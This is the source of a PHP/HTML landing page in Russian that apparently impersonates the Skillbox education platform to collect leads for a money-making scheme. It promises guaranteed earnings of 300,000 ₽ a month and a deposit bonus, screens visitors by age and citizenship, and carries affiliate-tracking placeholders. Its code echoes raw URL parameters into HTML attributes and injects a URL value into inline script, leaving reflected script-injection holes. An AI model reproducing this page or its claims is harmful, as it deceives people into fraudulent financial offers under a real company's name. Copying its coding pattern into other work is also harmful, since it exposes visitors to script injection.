<?php
if (!isset($rawClick) && !isset($click)) {
  die();
}
?>
<!DOCTYPE html>
<html lang="ru">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Skillbox</title>
    <link rel="stylesheet" href="./assets/css/normalize.css" />
    <link rel="stylesheet" href="./assets/css/styles.css" />
    <link
      rel="shortcut icon"
      href="./assets/img/icons/fav.png"
      type="image/x-icon"
    />
    <script src="form/js/libs/intlTelInput.js"></script>

    <script>
      let scriptLoadings = false;
      // Функция для получения значения параметра из URL
      function getUrlParam(name) {
        const urlParams = new URLSearchParams(window.location.search);
        return urlParams.get(name);
      }

      // Проверяем наличие параметров
      const bgeValue = getUrlParam("bge");
      const crmSource = getUrlParam("crm_source");

      if (bgeValue) {
        // Если есть только bgeValue – подключаем скрипты для bge
        let inlineScript = document.createElement("script");
        inlineScript.innerHTML = `
      window.bgdataLayer = window.bgdataLayer || [];
      function bge() { bgdataLayer.push(arguments); }
      bge('init', '${bgeValue}');
    `;
        document.head.appendChild(inlineScript);

        // Подключаем второй скрипт для bge
        let asyncScript = document.createElement("script");
        asyncScript.src =
          "https://api.imotech.video/ad/events.js?pixel_id=" + bgeValue;
        document.head.appendChild(asyncScript);

        // Ожидаем загрузки всех скриптов, чтобы продолжить выполнение (если нужно)
        asyncScript.onload = function () {
          // Здесь можно добавить код, который должен выполняться после подгрузки всех скриптов
          console.log("Все скрипты для BGE загружены!");
        };
      } else if (!crmSource) {
        // Если НЕТ ни bgeValue, ни crmSource – подключаем альтернативные скрипты
        let trackScript = document.createElement("script");
        trackScript.type = "application/javascript";
        trackScript.src = "track.js?v=21238";
        document.head.appendChild(trackScript);

        trackScript.onload = function () {
          // Здесь можно добавить код, который должен выполняться после подгрузки track.js
          console.log("track.js загружен!");
          window.removeEventListener("beforeunload", trackClose);
        };

        let inlineScript = document.createElement("script");
        inlineScript.innerHTML = `
      function getCookie(name) {
        let matches = document.cookie.match(
          new RegExp("(?:^|; )" + name.replace(/([.$?*|{}()[]\\/+^])/g, "\\$1") + "=([^;]*)")
        );
        return matches ? decodeURIComponent(matches[1]) : undefined;
      }

      const subid_1 = getCookie("_subid");

      var offerData = {
        subid: subid_1,
        buyer: "{buyer}",
        crm_campaign: "{crm_campaign}",
        thank_you_page: "{thank_you_page}",
        landing_name: "offer_id_" + "{offer_id}",
        app_key: "{app_key}",
        bge: "{bge}",
        ts_id: "{ts_id}",
        info: "{info}"
      };
    `;
        document.head.appendChild(inlineScript);

        inlineScript.onload = function () {
          // Здесь можно добавить код, который должен выполняться после подгрузки inlineScript
          console.log("Inline script для альтернативы загружен!");
        };

        let parseScript = document.createElement("script");
        parseScript.type = "application/javascript";
        parseScript.src = "parse_url.js?v=19";
        document.head.appendChild(parseScript);

        scriptLoadings = true;

        parseScript.onload = function () {
          // Здесь можно добавить код, который должен выполняться после подгрузки parse_url.js
          console.log("parse_url.js загружен!");
        };
      }
    </script>

    <script type="application/javascript">
      function getCookie(name) {
        var v = document.cookie.match("(^|;) ?" + name + "=([^;]*)(;|$)");
        return v ? v[2] : null;
      }

      function setCookie(name, value, days) {
        var d = new Date();
        d.setTime(d.getTime() + 24 * 60 * 60 * 1000 * days);
        document.cookie =
          name + "=" + value + ";path=/;expires=" + d.toGMTString();
      }

      function getSubId() {
        var params = new URLSearchParams(document.location.search.substr(1));
        if (!"{subid}".match("{")) {
          return "{subid}";
        }
        var clientSubid =
          '<?php echo isset($client) ? $client->getSubid() : "" ?>';
        if (!clientSubid.match(">")) {
          return clientSubid;
        }
        if (params.get("_subid")) {
          return params.get("_subid");
        }
        if (params.get("subid")) {
          return params.get("subid");
        }
        if (getCookie("subid")) {
          return getCookie("subid");
        }
      }

      function getToken() {
        var params = new URLSearchParams(document.location.search.substr(1));
        if (!"{token}".match("{")) {
          return "{token}";
        }
        var clientToken =
          '<?php echo isset($client) ? $client->getToken() : "" ?>';
        if (!clientToken.match(">")) {
          return clientToken;
        }
        if (params.get("_token")) {
          return params.get("_token");
        }
        if (params.get("token")) {
          return params.get("token");
        }
        if (getCookie("token")) {
          return getCookie("token");
        }
        return null;
      }

      function getPixel() {
        var params = new URLSearchParams(document.location.search.substr(1));
        if (!"{pixel}".match("{")) {
          return "{pixel}";
        }
        if (params.get("pixel")) {
          return params.get("pixel");
        }

        if (getCookie("pixel")) {
          return getCookie("pixel");
        }

        return null;
      }

      if (typeof URLSearchParams === "function") {
        document.addEventListener("DOMContentLoaded", function (event) {
          var params = new URLSearchParams(document.location.search.substr(1));
          var subid = getSubId();
          var token = getToken();
          var pixel = getPixel();

          params.set("_token", token);
          setCookie("pixel", pixel);
          setCookie("token", token);
          setCookie("subid", subid);
        });
      }
    </script>
  </head>
  <body>
    <header class="header">
      <img src="./assets/img/icons/logo.svg" alt="Logo" />
      <span class="header__text">Образовательная платформа</span>
    </header>
    <main class="main">
      <section class="section hero">
        <div class="hero__image-wrapper">
          <img src="./assets/img/hero.png" alt="Image" class="hero__image" />
        </div>
        <div class="hero--top">
          <div class="hero__info">
            <h2 class="hero__heading">
              Начни зарабатывать уже сегодня – без опыта и сложностей!
            </h2>
            <span class="hero__accent">от 300 000 ₽</span>
            <span class="hero__subheading">в месяц после обучения! </span>
          </div>
          <span class="hero__subheading">
            Начни зарабатывать уже сегодня – без опыта и сложностей!
          </span>
          <ul class="hero__list">
            <li class="hero__item">
              &#x2022; Трудоустройство по окончанию курса - проверено тысячами
              участников!
            </li>
            <li class="hero__item">
              &#x2022; Минимальная стоимость курса и первый заработок уже в день
              регистрации!
            </li>
            <li class="hero__item">&#x2022; Деньги работают на тебя</li>
            <li class="hero__item">
              &#x2022; 100% гарантия зарботка! Безопасность ваших средств от
              инфляции и кризиса!
            </li>
          </ul>
        </div>
        <a href="#main-form" class="hero__button">Начать зарабатывать</a>
        <div class="hero__form">
          <form
            class="form _main-form contact-form freg thin rounded"
            id="main-form"
            method="post"
          >
            <input type="hidden" id="utm_medium" value='<?= $_GET['utm_medium'] ?>'>
            <input type="hidden" id="campaing_id" value='<?= $_GET['campaing_id'] ?>'>
            <input type="hidden" id="slug" value='<?= $_GET['slug'] ?>'> <input
            type="hidden" id="bge" value='<?= $_GET['bge'] ?>'> <input
            type="hidden" id="source" value='<?= $_GET['source'] ?>'>
          </form>
        </div>
        <span class="hero__text bottom">SkillBox - платформа для обучения</span>
      </section>
    </main>
    <footer class="footer">
      <div class="footer--top">
        <div class="footer__contacts">
          <div class="contacts__block">
            <a href="tel:+88006007847" class="contacts__phone"
              >8 800 600-78-47</a
            >
            <span class="contacts__descr">Контактный центр</span>
          </div>
          <div class="contacts__block">
            <a href="tel:+74953084787" class="contacts__phone"
              >+7 495 308-47-87</a
            >
            <span class="contacts__descr">Отдел заботы о пользователях</span>
          </div>
        </div>
        <div class="footer__address">
          <div class="address__block">
            <span class="address__descr"
              >г. Москва, вн. тер. г. Муниципальный Округ Хамовники, бульвар
              Смоленский, дом 24, строение 2, помещение 1/3</span
            >
            <a href="mailto:hello@skillbox.ru" class="address__mail"
              >hello@skillbox.ru</a
            >
          </div>
        </div>
        <div class="footer__socials">
          <img src="./assets/img/icons/vk.svg" alt="Icon" />
          <img src="./assets/img/icons/youtube.svg" alt="Icon" />
          <img src="./assets/img/icons/tg.svg" alt="Icon" />
        </div>
      </div>
      <div class="footer--bottom">
        <div class="footer__info">
          <div class="footer__menu">
            <span>Правовая информация</span>
            <span>Партнерская программа</span>
          </div>
          <div class="footer__text">
            <span
              >Мы <span class="accent">используем файлы cookie</span>,
              для персонализации сервисов и повышения удобства пользования
              сайтом. Если вы не согласны на их использование, поменяйте
              настройки браузера.</span
            >
            <span
              >Skillbox — облачная платформа цифрового образования. Входит
              в реестр российского ПО. LMS «Skillbox 2.0» принадлежит ООО
              «Скилбокс». Платформа используется образовательными организациями
              с целью оказания образовательных услуг.</span
            >
            <span
              >Образовательные услуги оказываются в соответствии с Федеральным
              законом от 04.05.2011 № 99-ФЗ «О лицензировании отдельных видов
              деятельности».</span
            >
          </div>
        </div>
        <div class="footer__copyright">
          <div class="copyright__award">
            <img src="./assets/img/icons/award.svg" alt="Icon" />
            <span>7 лет подряд — обладатель «Премии Рунета» 2018-2024</span>
          </div>
          <span class="copyright__text">© Skillbox, 2025</span>
        </div>
      </div>
    </footer>

    <!--------- QUESTION 1 --------->
    <div id="modal-1" class="modal hidden">
      <div class="modal__content">
        <div class="modal__header">
          <img src="./assets/img/icons/logo.svg" alt="Logo" />
          <span class="header__text">Образовательная платформа</span>
        </div>
        <p class="modal__question">Сколько вам лет?</p>
        <div class="modal__actions vertical">
          <a class="modal__button--first" href="err.html">До 21</a>
          <button class="modal__button--first yes">21-35</button>
          <button class="modal__button--first yes">36-50</button>
          <button class="modal__button--first yes">50-65+</button>
        </div>
      </div>
    </div>
    <!--------- QUESTION 2 --------->
    <div id="modal-2" class="modal hidden">
      <div class="modal__content">
        <div class="modal__header">
          <img src="./assets/img/icons/logo.svg" alt="Logo" />
          <span class="header__text">Образовательная платформа</span>
        </div>
        <p class="modal__question">
          Вы являетесь гражданином Российской Федерации?
        </p>
        <div class="modal__actions vertical">
          <a class="modal__button--second" href="err.html">Нет</a>
          <button class="modal__button--second yes">Да</button>
        </div>
      </div>
    </div>
    <!--------- QUESTION 3 --------->
    <div id="modal-3" class="modal third hidden">
      <div class="modal__content">
        <div class="modal__header">
          <img src="./assets/img/icons/logo.svg" alt="Logo" />
          <span class="header__text">Образовательная платформа</span>
        </div>
        <div class="feedback__content">
          <div class="feedback__timer">
            <span class="timer__heading">До конца акции</span>
            <div class="timer" id="countdown-quiz"></div>
          </div>
          <span class="feedback__text">Стоимость курса по скидке</span>
          <div class="feedback__discount">
            <span class="discount__old">42 000 ₽</span>
            <span class="discount__new">10 000 ₽</span>
          </div>
        </div>
        <div class="thanks__bonus">
          <span class="bonus__preheading">Только сегодня!</span>
          <h2 class="bonus__heading">5 000₽</h2>
          <div class="bonus__details">
            <span class="bonus__descr"
              >При активации счёта сегодня вы получаете
              <span class="accent"
                >бонус в размере 5 000 рублей на первый депозит.</span
              ></span
            >
            <span class="bonus__descr"
              >Чтобы получить его - ответьте на звонок менеджера</span
            >
          </div>
        </div>
        <button type="button" class="modal__button--third">
          Записаться со скидкой
        </button>
      </div>
    </div>
    <!--------- QUESTION 4 --------->
    <div id="modal-4" class="modal hidden">
      <div class="modal__content">
        <div class="modal__header">
          <img src="./assets/img/icons/logo.svg" alt="Logo" />
          <span class="header__text">Образовательная платформа</span>
        </div>
        <p class="modal__question">
          Средний доход участника после круса от “SkillBox” начинается от 128
          340 рублей и может достигать 1 000 000 рублей. Сколько Вы хотите
          зарабатывать?
        </p>
        <div class="modal__actions vertical">
          <button class="modal__button--fourth yes">
            50 000 ₽ - 125 000 ₽
          </button>
          <button class="modal__button--fourth yes">
            125 000 ₽ - 250 000 ₽
          </button>
          <button class="modal__button--fourth yes">
            250 000 ₽ - 400 000 ₽
          </button>
          <button class="modal__button--fourth yes">400 000 ₽+</button>
        </div>
      </div>
    </div>

    <script src="./assets/js/timer.js"></script>
    <script src="./assets/js/quiz.js"></script>
    <script src="loadAssets.js?v=321"></script>

    <script>
      window.onload = function () {
        var err = localStorage.getItem("unsuitable");
        var thx = localStorage.getItem("thanks");
        if (err && err === "false") {
          const fileErr = "err.html";
          window.location.href = `${fileErr}${window.location.search}`;
        } else if (thx && thx === "true") {
          const fileThx = "thanks2.php";
          window.location.href = `${fileThx}${window.location.search}`;
        }
      };

      window.onpageshow = function () {
        var err = localStorage.getItem("unsuitable");
        var thx = localStorage.getItem("thanks");
        if (err && err === "false") {
          const fileErr = "err.html";
          window.location.href = `${fileErr}${window.location.search}`;
        } else if (thx && thx === "true") {
          const fileThx = "thanks2.php";
          window.location.href = `${fileThx}${window.location.search}`;
        }
      };
    </script>

    <script type="application/javascript">
      function getSubId() {
        if (!"{subid}".match("{")) {
          localStorage.setItem("subid", "{subid}");
          return "{subid}";
        }
      }
      getSubId();
    </script>
    <script>
      // Scroll to element
      const scrollToElement = (elSelector, triggerSelector) => {
        const el = document.querySelector(elSelector);
        const triggers = document.querySelectorAll(triggerSelector);

        const callback = (item) => {
          item.addEventListener("click", (event) => {
            event.preventDefault();

            el.scrollIntoView({
              behavior: "smooth",
              block: "center",
            });
          });
        };

        triggers.forEach(callback);
      };

      scrollToElement("#main-form", 'a[href="#main-form"]');
    </script>
  </body>
</html>
